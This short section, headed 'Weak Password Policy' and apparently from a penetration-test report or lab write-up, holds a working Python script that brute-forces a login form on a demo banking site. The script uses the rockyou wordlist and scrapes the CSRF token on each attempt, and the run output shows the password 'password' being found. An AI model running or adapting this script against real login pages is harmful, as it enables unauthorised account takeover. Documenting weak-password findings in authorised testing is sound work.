VII. Weak Password Policy

import requests as req

wordlist = open("/usr/share/wordlists/rockyou.txt", "r")

target = "http://zero.webappsecurity.com"
while True:
    ses = req.session()
    res = ses.get(target + "/login.html")
    
    payload = {
        "user_login": "username",
        "user_password": wordlist.readline().strip(),
        "submit": "Sign in",
        "user_token": res.text.split('name="user_token" value="')[1][0:36]
    }

    res = ses.post(target + "/signin.html", data=payload, allow_redirects=False)
    if res.headers["Location"] == "/login.html?login_error=true":
        print("[-] PASSWORD ATTEMPT:\t{}".format(payload["user_password"]))
    else:
        print("[+] PASSWORD FOUND:\t{}".format(payload["user_password"]))
        break

wordlist.close()

$ python3 bruteforce.py

  [-] PASSWORD ATTEMPT:	123456
  [-] PASSWORD ATTEMPT:	12345
  [-] PASSWORD ATTEMPT:	123456789
  [+] PASSWORD FOUND:	password

